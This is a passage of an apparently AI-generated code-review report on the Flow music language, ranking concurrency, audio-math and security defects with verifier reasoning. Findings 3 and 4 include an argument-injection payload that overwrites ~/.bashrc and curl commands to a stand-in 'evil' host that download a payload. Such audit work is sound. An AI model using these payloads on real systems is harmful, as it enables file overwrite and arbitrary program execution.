# Cold-Zone Code Review — lesser-tested Flow features

Multi-agent review (6 review targets, every finding adversarially verified by an independent agent instructed to refute it). 19 raw findings -> **15 confirmed, 4 refuted**. 2026-07-01.

## Confirmed findings (severity-ranked)

### 1. [HIGH] flow-lang/Audio/MidiClock.cs:262

**Master clock reads ExecutionContext.GetMusicalContext() from its background thread, racing the interpreter's non-thread-safe _callStack, which crashes the process or silently kills the clock.**

Failure scenario: clockMaster wires _liveTempoReader = () => context.GetMusicalContext() (MidiClockFunctions.cs:65). GetMusicalContext (ExecutionContext.cs:924) does `foreach (var frame in _callStack)` over a plain Stack<StackFrame> whenever its cache is null (i.e. right after any mutation). The master timing thread invokes _liveTempoReader() at ReadTempoOrDefault line 262. Meanwhile the interpreter thread keeps executing the script after clockMaster returns — every proc call / tempo block / note render Push/Pop-s _callStack, invalidating the cache and mutating the Stack. A concurrent Push/Pop during the master's foreach throws InvalidOperationException (collection modified). At the pre-loop read (line 165, outside the try at 168) it escapes RunMasterLoop → unhandled background-thread exception → whole process aborts. At the in-loop bar-boundary read (line 181) it is caught at line 199, WarnOnce fires once, and the loop falls through to finally → the master silently stops emitting 0xF8/sends 0xFC mid-session. Either way a completely benign, expected concurrent script action ends the clock.

Fix sketch: Do not call GetMusicalContext() from the timing thread. Either snapshot tempo onto the Interlocked live-tempo sink from the interpreter thread and have the master read only _context.TryGetLiveTempo(), or make GetMusicalContext()/_callStack access lock-protected/thread-safe. At minimum wrap the _liveTempoReader() call at line 262 in try/catch so a race degrades charitably instead of crashing.

<details><summary>Verifier reasoning</summary>

CONFIRMED — the failure scenario survives scrutiny at every link. (1) MidiClockFunctions.cs:65 wires the master's live-tempo reader to `() => context.GetMusicalContext().Tempo`, capturing the engine's single shared ExecutionContext; StartMaster (MidiClock.cs:135-153) starts a background Thread and returns, so the interpreter keeps executing the script concurrently. (2) ReadTempoOrDefault (MidiClock.cs:249) reaches `_liveTempoReader()` (line 262) whenever TryGetLiveTempo (MusicalContext.cs:90) returns false — which is the default for a plain master (live sink = LiveTempoUnset), so the path is reachable, not short-circuited. (3) GetMusicalContext (ExecutionContext.cs:913) does `foreach (var frame in _callStack)` at line 924 over a plain Stack<StackFrame> (declared line 15) with NO lock anywhere, whenever `_cachedMusicalContext` is null. (4) The interpreter thread nulls that cache on every PushFrame/PopFrame (ExecutionContext.cs:724, 746), and it does a Push/Pop on every proc/lambda call and every musical-context/loop/section block (Interpreter.cs:1361, ExpressionEvaluator.cs:1512, etc.) — continuously, on its own thread. So the master's foreach runs against a Stack being concurrently Push/Pop-ed → InvalidOperationException ("collection modified") or a torn read on an array resize. (5) The pre-loop read at MidiClock.cs:165 sits OUTSIDE the try (which opens at line 168): an exception there escapes RunMasterLoop, the thread entry point → unhandled background-thread exception → .NET process abort. The in-loop read at line 181 is caught at line 199, WarnOnce fires, and because the catch is OUTSIDE the while loop the master exits via finally (sends 0xFC) → clock silently and permanently dead. Both outcomes contradict the module's own contract at MidiClock.cs:37-39 ("NEVER throws ... + continues") and the "never dies mid-set" philosophy. This is NOT intentional charity: the swallow either crashes the whole process or permanently kills the clock from a completely benign, expected concurrent script action. Damningly, the sweep-0614 feature's stated purpose (retuning the clock when a later `tempo N { }` runs) requires the interpreter to mutate `_callStack` while the master reads it, so the intended use case is itself the race trigger. No upstream lock, GIL, or blocking call prevents the concurrency — `_callStack` mutations are entirely unsynchronized (only the slave's _slaveLock exists, and it guards different state). Severity high rather than critical only because it is a probabilistic data race gated on `use "@midi"` + clockMaster + concurrent activity; its worst-case is a full process crash mid-performance, with collision probability accumulating over every bar-boundary read across a live session.

</details>

### 2. [HIGH] flow-lang/StandardLibrary/Audio/Vocalization/TtsHook.cs:61

**stderr pipe is never drained while stdout is read synchronously, so a TTS child that writes >~64KB to stderr deadlocks the interpreter forever and the 30s cap never fires**

Failure scenario: Both stdout and stderr are redirected. Line 61 does a blocking CopyTo of stdout to completion BEFORE WaitForExit is ever called (line 63); stderr is only read at line 71 after exit. If the TTS process (e.g. espeak-ng emitting verbose warnings, or any user-set command) writes more than the OS pipe buffer (~64KB on Linux) to stderr, its write() blocks, so it never closes stdout and never exits; CopyTo blocks waiting for stdout EOF; WaitForExit(30000) is never reached. Result: permanent hang of the whole single-threaded interpreter with no timeout, violating both the 30s cap and 'never die mid-set'.

Fix sketch: Drain stderr concurrently: start process.StandardError.ReadToEndAsync() (or a reader thread) before the synchronous stdout CopyTo, and/or read stdout async too, then WaitForExit with the timeout.

<details><summary>Verifier reasoning</summary>

Confirmed real. TtsHook.cs redirects both stdout and stderr (lines 52-53), then at line 61 does a blocking `process.StandardOutput.BaseStream.CopyTo(memStream)` with no timeout, and only reaches `WaitForExit(30000)` at line 63 AFTER CopyTo returns; stderr is read only at line 71 after exit. This is the canonical .NET Process deadlock: if the child fills its ~64KB stderr pipe buffer and blocks on write() before closing stdout, stdout never hits EOF, CopyTo blocks forever, and line 63's 30s cap is never reached. Result is a permanent hang of the single-threaded interpreter with no timeout.

The scenario is reachable: the `tts` builtin (VocalizationFunctions.cs:104) calls RunTts directly with no wrapping, and `setTtsCommand` (→ TtsHook.SetCommand) lets a composer point at any command, so a verbose engine/wrapper emitting >64KB to stderr (or espeak-ng emitting many unknown-word warnings on long text) triggers it. Nothing upstream bounds stderr.

Refutations fail: (1) the 30s cap does NOT save it because it is downstream of the untimed blocking CopyTo; (2) draining stdout does not relieve the child's stderr backpressure since the child is blocked on a stderr write; (3) the interleave ordering is realistic (verbose stderr before stdout close, or warnings accumulating while WAV streams); (4) this is not charitable house-style — a silent permanent hang with no advisory or fallback is strictly worse than a clean death and defeats the documented 30s cap and the never-die-mid-set contract.

Severity high: consequence is an unrecoverable full-interpreter hang that bypasses the timeout designed to prevent exactly this; it requires a non-default or verbose TTS command so the everyday espeak-ng happy path is usually safe, hence high rather than critical.

</details>

### 3. [HIGH] flow-lang/StandardLibrary/Audio/Vocalization/TtsHook.cs:51

**Text is interpolated into the process Arguments string with naive double-quote wrapping, allowing argument injection into the TTS executable from plain tts(text)**

Failure scenario: Arguments = $"{baseArgs} \"{text}\"". Under UseShellExecute=false on Unix, .NET tokenizes the Arguments string honoring double-quotes. A text value containing a double-quote breaks out of the wrapper and injects additional argv entries into the (default) espeak-ng process. E.g. tts("hi\" -w /home/user/.bashrc \"") yields argv [--stdout, hi, -w, /home/user/.bashrc, ...]; espeak-ng's -w writes its WAV to that path, overwriting an arbitrary file — triggered by a downloaded .flow with no setTtsCommand call at all.

Fix sketch: Use ProcessStartInfo.ArgumentList (adds argv elements without shell/quote parsing) instead of building the Arguments string, and pass text as its own list element.

<details><summary>Verifier reasoning</summary>

Confirmed real and reachable. TtsHook.cs:51 builds `Arguments = $"{baseArgs} \"{text}\""` with UseShellExecute=false (line 54). On Unix, .NET re-tokenizes the single Arguments string into argv using Windows-style rules that honor double-quotes (the reason ArgumentList exists), so an embedded `"` in `text` breaks out of the wrapper and injects independent argv entries.

Reachability is unbroken: VocalizationFunctions.cs:30 registers the composer-callable builtin `tts(String)`; VocalizationFunctions.cs:101-106 passes `args[0].As<string>()` straight to TtsHook.RunTts with zero sanitization; SimpleLexer.cs:287 lets a `.flow` string literal encode a literal double-quote via `\"`. The default `_ttsCommand="espeak-ng --stdout"` (TtsHook.cs:11) means a downloaded `.flow` needs no setTtsCommand call at all. For `tts("hi\" -w /path \"")`, Arguments becomes `--stdout "hi" -w /path ""`, tokenizing to `[--stdout, hi, -w, /path, ""]` — the injected `-w /path` reaches espeak-ng.

This is not covered by the house "charitable interpretation" policy (that governs degenerate musical inputs with clamp+advisory; here there is no advisory and no safe fallback — it is a straight pass-through). The repo's own gist/playground sharing model plus desktop `flow run file.flow` make untrusted `.flow` a legitimate threat surface (precondition: a TTS binary installed).

Severity adjusted to high rather than critical: UseShellExecute=false prevents shell-metacharacter execution, so this is argument injection (CWE-88) into a fixed binary, not arbitrary command/code execution. The realistic impact ceiling is espeak-ng's own flags — notably `-w <path>` opening/overwriting an arbitrary WAV output file (integrity/file-truncation) and similar option abuse — a serious defect but not full system compromise. Could not refute; the concrete scenario survives.

</details>

### 4. [HIGH] flow-lang/StandardLibrary/Audio/Vocalization/TtsHook.cs:22

**setTtsCommand stores an arbitrary command whose first token becomes the executable, giving a downloaded .flow file arbitrary local program execution**

Failure scenario: SetCommand only rejects null/whitespace, then RunTts splits on the first space (line 41) and runs parts[0] as the FileName with parts[1] as base args plus the text. A shared 'music file' can call setTtsCommand("curl http://evil/x -o /tmp/x") (or any executable+args) followed by tts("go") to execute an arbitrary program with attacker-controlled arguments. There is no allowlist, no confirmation, and no opt-in gate — arbitrary command execution from what is presented as an audio-only music file.

Fix sketch: Gate setTtsCommand behind an explicit opt-in (env var / config / pragma), or restrict to an allowlist of known TTS binaries; at minimum emit a loud one-shot advisory when a non-default command is set.

<details><summary>Verifier reasoning</summary>

CONFIRMED. The failure scenario is fully reachable with the claimed inputs. TtsHook.SetCommand (flow-lang/StandardLibrary/Audio/Vocalization/TtsHook.cs:17-23) validates only null/whitespace and stores the raw string at line 22 — no allowlist, confirmation, or opt-in gate. RunTts (line 39-83) then does `_ttsCommand.Split(' ', 2)` at line 41, uses parts[0] as ProcessStartInfo.FileName (line 50) and parts[1] as base Arguments with the text appended as a final quoted arg (line 51), UseShellExecute=false (line 54), and calls process.Start() at line 58. Both builtins are registered unconditionally in VocalizationFunctions.Register (lines 30, 35), wired at BuiltInFunctions.cs:114, and exposed as `internal proc tts`/`internal proc setTtsCommand` in audio.flow:771,774 — reachable from the ubiquitous `use "@audio"` with no module gate. This is the ONLY Process.Start in the entire flow-lang stdlib (grep-verified), so it is the sole, unguarded process-execution primitive. A shared/downloaded .flow can therefore do `use \"@audio\"` + `setTtsCommand(\"curl -o /home/victim/.bashrc http://evil/x\")` + `tts(\"\")` to run curl and overwrite a login script, or chain multiple setTtsCommand+tts pairs to download/chmod/run a payload — full local arbitrary-program execution with attacker-controlled argv.\n\nRefutation attempts fail: (a) this is NOT the house charitable-interpretation style, which concerns degenerate MUSICAL inputs getting clamps + one-shot advisories, not launching arbitrary executables; (b) nothing upstream gates it — @audio is the primary sound module every example imports; (c) UseShellExecute=false only prevents shell-metacharacter pipeline injection, but direct exec of an arbitrary binary + args is already complete compromise.\n\nSeverity adjusted to high (not critical): the flow-site browser playground — the most automatic 'open a shared link and it runs' vector — is immune because System.Diagnostics.Process.Start throws PlatformNotSupportedException under Mono-WASM. The realistic vector is the DESKTOP interpreter running a downloaded .flow file, which the project actively encourages via gist/URL-fragment sharing while presenting files as audio-only music. That is a genuine, unguarded arbitrary-command-execution escape hatch inconsistent with Flow's explicit non-goal of general-purpose computation, but the exploitation precondition (victim runs an untrusted file on the desktop CLI) is the ordinary untrusted-code threat rather than drive-by RCE. Recommended fix direction: gate setTtsCommand behind an explicit opt-in/config-file-only mechanism or an allowlist, rather than accepting arbitrary commands from script-level calls.

</details>

### 5. [MEDIUM] flow-lang/Audio/MidiClock.cs:114

**_pulsesPerBar ignores the time-signature denominator, so bar boundaries are wrong for every non-/4 meter.**

Failure scenario: Line 112-114 computes _pulsesPerBar = PulsesPerQuarter * Numerator, using only TimeSignature.Numerator. MIDI clock is fixed at 24 pulses per QUARTER note, so a bar is 24 * (Numerator*4/Denominator) = 24*4*Numerator/Denominator pulses. For 6/8 this should be 72 but the code gives 24*6=144; for 2/2 (cut time) it should be 96 but gives 48. TimeSignatureType.cs:35 even documents BarCapacityQuarters = Numerator*4/Denominator and warns bare Numerator 'is wrong everywhere a beat' is needed. Consequence: with clockMaster in 6/8 or 2/2, the master re-reads tempo (RunMasterLoop line 179) at the wrong pulse index, so a composer's mid-session tempo change lands one full bar late/early, and RequestModeSwitch's AtBarBoundary gate (line 469) fires at the wrong musical position.

Fix sketch: int beatsPerBar unit is wrong; compute pulses-per-bar from quarters: _pulsesPerBar = (int)Math.Round(PulsesPerQuarter * 4.0 * numerator / denominator), reading TimeSignature.Denominator (default 4).

<details><summary>Verifier reasoning</summary>

Confirmed real. MidiClock.cs:114 computes _pulsesPerBar = PulsesPerQuarter(24) * Numerator, using only TimeSignature.Numerator and ignoring the denominator. MIDI clock is fixed at 24 pulses per QUARTER note, and a bar holds Numerator*4/Denominator quarters, so the correct value is 24*Numerator*4/Denominator. The code is right only when Denominator==4. For 6/8 it yields 144 (should be 72); for 2/2 it yields 48 (should be 96). The sibling type TimeSignatureType.cs:35 (BarCapacityQuarters = Numerator*4/Denominator) explicitly warns "Bare Numerator ... is wrong everywhere a beat total is converted to seconds or ticks — use this instead," proving the codebase knows this trap and fixed it elsewhere but missed here.

Reachable: MusicalContext.TimeSignature (line 42) is populated by a `timesig N/D { }` block; MidiClockFunctions.cs:56 snapshots it via context.GetMusicalContext(), and the wiring comment (line 54-55) states the intent that _pulsesPerBar "seed correctly" from the active timesig. A composer running `timesig 6/8 { ... (clockMaster dev) ... }` hits _pulsesPerBar=144.

Not charity: no advisory, clamp, or fallback — just an arithmetic error; the doc comment at 87-89 shows the author conflated "beats-per-bar" with "numerator." Nothing upstream corrects it.

Consequences survive: RunMasterLoop line 179 re-reads a changed tempo at pulseIndex % _pulsesPerBar == 0, so in 6/8 a mid-session tempo change lands at 2-bar granularity (up to a full bar late); in 2/2 the tempo re-read and AtBarBoundary/RequestModeSwitch gate (lines 469/455) fire at half-bar positions — musically wrong. This matches the reviewer's failure scenario.

Severity lowered to medium (from an implied high): this is a realtime-only path that never touches writeWav/writeMidi, so the offline determinism contract is intact. The emitted 24-PPQN pulse stream and BPM remain correct (a slaved DAW derives its own bar position); only the tempo-change application granularity and mode-switch gate position are wrong, only for non-/4 meters, and only behind opt-in `use "@midi"` + a device. Genuine correctness defect but bounded in blast radius.

</details>

### 6. [MEDIUM] flow-lang/StandardLibrary/Audio/Timeline.cs:253

**CalculatePanGain applies constant-power pan-law attenuation to already-stereo voices, so a stereo voice at neutral pan loses 3 dB on both channels**

Failure scenario: loadWav a full-scale stereo file -> createVoice (Voice.Pan defaults 0) -> addVoice onto a stereo Track (Track.Pan defaults 0) -> renderTrack. totalPan=0, so CalculatePanGain(0)=cos(pi/4)=0.707 and CalculatePanGain(1)=sin(pi/4)=0.707. Both L and R of the stereo source are multiplied by 0.707, i.e. the mix is ~3 dB quieter than the source at otherwise unity/neutral settings. Constant-power law is correct for a MONO source split into two channels (as the mono block at line 235 does), but wrong for a source that already has L and R — it should pass through at unity when centered.

Fix sketch: Only apply the cos/sin balance law to mono->stereo promotion; for a stereo source use a balance law that is unity at center (e.g. left*=min(1,1-pan), right*=min(1,1+pan)) or skip pan entirely when voice.Buffer.Channels==2 and pan==0.

<details><summary>Verifier reasoning</summary>

The defect is real and the concrete failure scenario is fully reachable. In RenderTrack (Timeline.cs:211-232), for a stereo voice on a stereo track the inner loop `for (ch = 0; ch < voice.Buffer.Channels && ch < track.Channels; ch++)` runs ch=0 and ch=1 over the source's own L and R samples, and line 226 multiplies each by CalculatePanGain(ch, voice.Pan, track.Pan). At neutral pan (totalPan=0), CalculatePanGain returns cos(pi/4)=0.707 for Left and sin(pi/4)=0.707 for Right (Timeline.cs:262/266), so both channels are attenuated by ~3.01 dB. The mono-duplication compensation block (line 235, guarded by `voice.Buffer.Channels == 1`) does NOT fire for a stereo voice, so nothing offsets the loss.

Reachability confirmed at every link: (1) loadWav preserves channel count — FileIO.cs:498-499 does `new AudioBuffer(frames, channels, sampleRate)`, so a stereo WAV yields a 2-channel buffer; (2) Voice.Pan defaults to 0.0 (Voice.cs:52) and Track.Pan defaults to 0.0 (Track.cs:53); (3) createVoice/createTrack/addVoice/renderTrack are registered builtins (BuiltInFunctions.cs:1077-1164) and have matching `internal proc` surfaces plus a `createStereoTrack` helper in composition.flow, so they are composer-callable (satisfying the builtin-needs-a-flow-surface rule).

This is NOT house-style charity: there is no advisory, no clamp, no fallback — just a silent, unconditional gain reduction. The constant-power law is correct only for the mono-split case (the line 235 block), where 0.707 on each duplicated channel preserves L^2+R^2=1. Applied to an already-stereo source it wrongly scales two independent full-scale channels down by 3 dB at center, and mis-attenuates them at any non-center pan (a balance law is needed instead). renderTrack returns the buffer un-normalized, so the loss propagates into writeWav output (deterministic but wrong).

Severity adjusted to medium rather than high: the Timeline path is explicitly legacy/superseded by the Song/Section render path (per its own class doc comments), limiting blast radius, and the result is an audible ~3 dB level error rather than a crash or data corruption. But it is a genuine, concrete correctness defect reachable through a normal composer workflow (load a full-scale stereo loop, place it centered, render).

</details>

### 7. [MEDIUM] flow-lang/StandardLibrary/Audio/Timeline.cs:216

**Stereo voice rendered into a mono track silently drops the right channel instead of folding L+R down**

Failure scenario: createMonoTrack (track.Channels=1) -> addVoice a stereo AudioBuffer whose content sits mostly/entirely in channel 1 (right) -> renderTrack. The inner loop `ch < voice.Buffer.Channels && ch < track.Channels` runs only ch=0, and the mono-duplicate block (line 235) requires voice.Buffer.Channels==1, so it never fires. Channel 1 of the voice is never read: the right-channel audio is discarded rather than summed into the mono output, producing a quieter or entirely silent render with no advisory.

Fix sketch: When voice.Buffer.Channels==2 and track.Channels==1, sum both source channels into the single output channel (mono fold-down) instead of iterating only up to track.Channels.

<details><summary>Verifier reasoning</summary>

CONFIRMED. Code trace at flow-lang/StandardLibrary/Audio/Timeline.cs:216 verifies the defect. The inner loop `for (int ch = 0; ch < voice.Buffer.Channels && ch < track.Channels; ch++)` is bounded by the MIN of the two channel counts, so a stereo voice (Channels=2) into a mono track (Channels=1) iterates ch=0 only, reading solely the left channel. The compensating mono-duplicate block at line 235 is gated on `voice.Buffer.Channels == 1 && track.Channels == 2`, so it never fires for a stereo voice — channel 1 (right) is read by nothing. No L+R fold-down happens.

Reachability is fully established: (1) createTrack/addVoice/createVoice/renderTrack are directly-registered composer-callable builtins (BuiltInFunctions.cs:1077-1164); (2) AddVoice (Timeline.cs:142) performs zero channel-match validation; (3) a mono track is constructible (createTrack passes channels straight through, no clamp); (4) a stereo buffer with content entirely in the right channel is a normal composer artifact — `(pan buf 1.0)` yields leftGain=cos(π/2)=0.0 and rightGain=sin(π/2)=1.0 (Panner.cs:22-46), i.e. left is EXACTLY zero and the whole signal is in the right channel; loadWav of a stereo file is another path. Concrete failure: pan a tone hard-right, wrap it in a Voice, addVoice to a mono track, renderTrack -> the loop reads channel 0 (exactly 0.0) and skips the mono-dupe block -> output is DEAD SILENT despite a full-amplitude voice. For any ordinary stereo voice into a mono track, the entire right channel is silently discarded (wrong downmix / quieter render).

Not house-style charity: the charitable-interpretation contract is clamp + one-shot advisory, but RenderTrack (lines 192-248) emits NO advisory (no WarnOnce, no Console.Error) and does NO L+R fold-down — it just drops the channel. The author explicitly coded the opposite mismatch (mono->stereo duplication at line 235) yet left stereo->mono as a silent zero-drop, an asymmetric oversight rather than a designed safe fallback; the repo has careful MonoToStereo/PromoteToStereo helpers but no ToMono counterpart wired here. Severity set to medium (not higher) because this lives in the legacy pre-Phase-25 Timeline manual-mix surface (superseded by SongRenderer), not the primary Song/Section render path, though it remains genuinely composer-reachable and silently loses audio.

</details>

### 8. [MEDIUM] flow-lang/Audio/TempoRampRenderer.cs:80

**Each bar is mixed into a buffer sized exactly to its beat count, so every note's release tail is hard-truncated at every bar boundary.**

Failure scenario: A whole-note in a 4/4 bar (e.g. `| C4w |`) rendered via tempoRamp: BarRenderer produces a voice whose buffer includes the synth ADSR release tail extending past 4 beats. MixVoicesToStereoBuffer (line 80) sizes barBuffer to exactly barBeats*secondsPerBeat*sampleRate and drops any `destFrame >= totalFrames`, so the release is cut. AppendBuffers then butts the next bar directly against that hard cut. Result: an audible click / lost sustain at every bar line — the opposite of the smooth ritardando the feature promises. The normal whole-sequence mix path does not clip at internal bar boundaries.

Fix sketch: Render voices for all bars with absolute beat offsets into one buffer (or add per-bar release headroom and overlap-add adjacent bar buffers) instead of truncate-and-concatenate.

<details><summary>Verifier reasoning</summary>

CONFIRMED. TempoRampRenderer.cs:80 sizes each bar's mix buffer to exactly the bar's nominal beat count and MixVoicesToStereoBuffer (SongRenderer.cs:587,603) drops every frame where destFrame >= totalFrames, then AppendBuffers (line 93) butts the next bar directly against the cut with no fade. The voice buffers genuinely extend past the bar: for the default synthType "piano", SampledInstrumentRenderer.Render sizes the buffer to authoredFrames + tailSeconds*sampleRate (line 150) and fills a real exponential ring-out tail (lines 266-275). Because the Phase 28 envelope holds baseSustain:1.0/baseRelease:0.0 through authoredFrames (line 230), the sample value AT the truncation point is at full sustain level, so cutting there yields a hard step discontinuity (a click) plus loss of the ~1.5s ring-out. The file's own comment (SampledInstrumentRenderer.cs:222-227) documents that exactly this kind of boundary step produced "audible per-beat static." The normal path (SequenceRenderer.RenderSequenceToVoices, lines 64-81) accumulates all voices across bars and mixes once into a whole-sequence buffer, so internal-bar tails are preserved — tempoRamp uniquely clips at every internal boundary. This is a silent quality regression (no advisory/clamp) that contradicts the feature's documented "smooth ritardando" purpose, so it is not house-style charity.\n\nHonest caveat that narrows but does not refute: the literal minimal repro (default piano, a single tempoRamp, no other calls) renders SILENCE rather than a click, because sampled-instrument samples load only via SampleCache.EagerLoad inside renderSong — never inside tempoRamp — so GetVarispeed returns null and PianoSynthesizer falls back to CreateSilence (a tailless buffer). The click therefore requires the samples to be loaded first, which occurs in the ordinary workflow of a script that calls renderSong (loading piano) earlier in the same engine session and then does a tempoRamp transition/outro. It also manifests without any sampled instrument when a bar-final note is tie-extended (BarRenderer.cs:135-140 adds a 100ms crossfade tail explicitly intended to bleed into the next bar), legato-, or sustain-extended past the bar's nominal beats — that extension is truncated even for the always-synthesized organ. Both routes are realistic, so the concrete failure (release/tie tail hard-truncated at bar boundaries → click + lost sustain) survives.\n\nSeverity medium: audible correctness/quality defect on every bar boundary in a composer-facing builtin, but confined to one lightly-used opt-in feature (tempoRamp), requires a plausible precondition to be audible with the default instrument, does not crash, and preserves two-run determinism.

</details>

### 9. [MEDIUM] flow-lang/StandardLibrary/Composition/PolyrhythmFunctions.cs:53

**polyrhythm hardcodes 120 BPM and ignores the ambient MusicalContext tempo stack.**

Failure scenario: `tempo 90 { (play (polyrhythm a b)) }` renders the overlay at 120 BPM, not 90 — the returned buffer's duration and groove are wrong relative to everything else in the 90-BPM context because `bpm = DefaultBpm` (line 53) is fixed and the function is registered without ExecutionContext access, so it cannot read the pushed tempo frame. Composer hears a polyrhythm that is a third too fast and out of sync with surrounding material.

Fix sketch: Register polyrhythm as context-dependent (like InputFunctions) and read the active MusicalContext.Tempo, or document the 120-BPM lock as an intentional constraint.

<details><summary>Verifier reasoning</summary>

CONFIRMED real. PolyrhythmFunctions.cs:53 sets `double bpm = DefaultBpm` (120.0) unconditionally, and the function is registered context-independently (BuiltInFunctions.cs:112 → Register with an `IReadOnlyList<Value> args` lambda), so it has no ExecutionContext and structurally cannot read the ambient tempo. The input SequenceData carries only tempo-agnostic TotalBeats — no tempo is baked in — so tempo is a pure render-time input, and polyrhythm's is fixed at 120.

Reachability holds: polyrhythm has a real .flow surface (composition.flow:187/190).

The "out of sync with the 90-BPM context" part survives concretely: a `section` declared inside `tempo 90 { }` captures GetMusicalContext() with Tempo=90 (Interpreter.cs:797-805), and SongRenderer.RenderSection renders it at `section.Context?.Tempo ?? DefaultBpm` = 90 (SongRenderer.cs:459). Beat-conversion (BeatConversionFunctions.cs:61/86) and tempo-synced effects (EffectsFunctions.cs:360/394) likewise read `GetMusicalContext().Tempo ?? 120.0`. So `tempo 90 { (play (renderSong s)) (play (polyrhythm a b)) }` yields renderSong at 90 and the polyrhythm overlay at 120 — audibly a third too fast and misaligned.

Not house-style charity: no `[advisory]` is emitted, the input is normal (not degenerate), and the 120 silently overrides the composer's explicit `tempo N { }`, violating the documented scoped-musical-context contract and diverging from every sibling context-dependent audio builtin. There is also NO workaround — polyrhythm exposes no bpm param (only totalBeats, which changes cycle length not tempo) and ignores Timeline._currentBPM too (it hardcodes 120 rather than calling Timeline.GetBPM as PlaySequence does), so a composer cannot render a polyrhythm at any tempo but 120. Even the author's own plan note ("default 120 BPM, matching SongRenderer defaults") is unmet: SongRenderer uses 120 only as a fallback when no context tempo exists, whereas polyrhythm uses it unconditionally.

Severity medium rather than high: it is a genuine musical-correctness defect (wrong tempo/duration, no escape) on a headline feature, but it causes no crash, no state corruption, no silence, and offline renders stay two-run deterministic (constant 120). Impact is limited to composers using polyrhythm outside 120 BPM.

</details>

### 10. [MEDIUM] flow-cli/Commands/Flow2MidiCommand.cs:53

**flow2midi exits 0 even when the Required --output MIDI file was never produced, so automation treats a no-op run as success**

Failure scenario: Run `flow flow2midi song.flow -o song.mid` where song.flow renders/plays but never calls (writeMidi "song.mid") — or calls it with a different path. engine.Execute succeeds, so ScriptRunner.RunScript returns 0. The command hits `!File.Exists(output.FullName)` at line 43, prints a yellow stderr warning, but then `return exit;` (line 53) returns the script's exit code 0. A CI/shell pipeline like `flow flow2midi song.flow -o song.mid && aws s3 cp song.mid ...` proceeds on the zero status and uploads a missing file. Worse: if song.mid already exists from a previous run, File.Exists is true, the warning is suppressed entirely, and a stale MIDI file is silently accepted as the current output.

Fix sketch: When the script exits 0 but output.FullName does not exist (or, better, was not written/modified during this run — capture File.GetLastWriteTimeUtc before RunScript), return a non-zero exit code instead of `exit` so the missing-artifact case fails the command; only return the success code when the requested output actually exists.

<details><summary>Verifier reasoning</summary>

Confirmed reachable and concrete. ScriptRunner.RunScript returns 0 on engine.Execute success (flow-interpreter/ScriptRunner.cs:37), reflecting script-execution success, not MIDI production. Flow2MidiCommand.cs captures that as `exit` (line 41), detects the missing output at line 43 (`!File.Exists(output.FullName)`), prints a yellow stderr warning (44-51), then `return exit;` at line 53 returns the script's 0. So `flow flow2midi song.flow -o song.mid` where the script never calls `(writeMidi "song.mid")` (or writes a different path) exits 0 with no file at -o, and a `... && aws s3 cp song.mid ...` pipeline proceeds because &&-chains key off the exit code, not stderr.

Refutation attempts all fail: (1) --output is Required=true (line 18) but never drives production nor the exit code, so requiring it only forces a path to be typed; (2) the warning is stderr-only and cannot influence a shell exit-status check; (3) it is not the runtime's charitable-interpretation contract — that concerns not throwing on degenerate MUSICAL input, whereas here the code explicitly detects the failed required deliverable (it literally prints "the script did not write to that path") and then reports success anyway, a self-contradicting exit-code contract; (4) the stale-file sub-case is strictly worse and violates even the house 'advisory + safe fallback' pattern: if song.mid exists from a prior run, File.Exists is true, the warning branch at 43 is skipped entirely, and line 53 returns 0 — a stale MIDI silently accepted as current output with no diagnostic, no pre-run delete, and no timestamp check.

Severity medium rather than higher/lower: it is a real correctness/contract defect in an automation-facing export CLI (exit 0 while the Required output is missing or stale → silent wrong/stale artifacts in CI), but it requires a script/-o path mismatch to trigger, is not a crash or memory-safety issue, and the missing-file case is at least surfaced on stderr. The fully-silent stale-file path keeps it above low.

</details>

### 11. [MEDIUM] flow-lang/StandardLibrary/Audio/NoteSynthesizer.cs:269

**Lazy built-in wavetable registration overwrites a composer's same-named custom oscillator, but only on the first render in a process — making identical source render differently across runs.**

Failure scenario: Built-in variants warm/bright/buzz are registered only inside EnsureBuiltinVariantsRegistered() on the FIRST SynthesizerFactory.Create() call (nothing else calls RegisterBuiltinVariants — the WavetableVariants doc claim that FlowEngine's constructor invokes it is stale/false). The composer `oscillator` builtin (BuiltInFunctions.cs:1192/1290/1304) calls RegisterWavetable directly and does NOT trip that gate. Sequence in a fresh process/engine: (1) `(oscillator "warm" myFn)` writes _customWavetables["warm"]=myTable; (2) `renderSong s "warm"` triggers the process's first Create → EnsureBuiltinVariantsRegistered runs → RegisterBuiltinVariants unconditionally overwrites _customWavetables["warm"] with the built-in table (RegisterWavetable does `dict[key]=value`, line 279). Composer's waveform is silently discarded and the built-in plays instead. On a SECOND FlowEngine in the same process (e.g. WASM run() #2, or live-coding reload), the static _builtinVariantsRegistered flag is already 1, so EnsureBuiltin no-ops and the composer's custom "warm" survives — so the exact same .flow source produces different audio bytes on run 1 vs run 2 within one process, breaking the D-48-16 two-run cmp-clean determinism contract.

Fix sketch: Register the built-in variants eagerly at FlowEngine construction (as the doc already claims), OR have RegisterBuiltinVariants use TryAdd / not overwrite an already-present key, so composer registrations always win regardless of Create ordering.

<details><summary>Verifier reasoning</summary>

CONFIRMED. Every load-bearing claim checks out against the code.

Mechanism: `SynthesizerFactory.Create` (NoteSynthesizer.cs:304) calls `EnsureBuiltinVariantsRegistered()` (NoteSynthesizer.cs:267-271), a process-static one-shot gate (`Interlocked.Exchange(ref _builtinVariantsRegistered, 1) == 0`). On the first-ever Create in the process it runs `WavetableVariants.RegisterBuiltinVariants()` (WavetableVariants.cs:42-53), which registers "warm"/"bright"/"buzz" via `SynthesizerFactory.RegisterWavetable` — an UNCONDITIONAL `_customWavetables[key] = value` overwrite (NoteSynthesizer.cs:279). The composer `oscillator` builtins (BuiltInFunctions.cs:1192/1290/1304) call `RegisterWavetable` directly and never trip that gate.

Refutations attempted and defeated:
- "FlowEngine constructor registers built-ins first (so composer overrides last)": REFUTED. grep proves the sole caller of RegisterBuiltinVariants is NoteSynthesizer.cs:270; FlowEngine.cs never calls it or Create. The WavetableVariants.cs:28-29 doc asserting constructor invocation is stale/false — that stale doc actually documents the INTENDED ordering the code fails to implement.
- "First Create happens before composer code (gate pre-tripped)": REFUTED. Create is only reachable from render paths (SongRenderer.cs:297, BarRenderer, SequenceRenderer); nothing renders at engine construction. In a fresh process a script that does `(oscillator "warm" myFn)` then `renderSong s "warm"` executes the registration first, then the first Create fires the gate and clobbers "warm".
- "Reserved names rejected": REFUTED. Neither RegisterWavetable nor the oscillator builtins validate/reject the names "warm"/"bright"/"buzz"; the composer can register any of them.
- "Charitable interpretation (advisory + safe fallback)": REFUTED. The overwrite is silent — no advisory, no error, wrong audio. That is not the clamp+advisory house pattern; it is silent loss of composer intent.

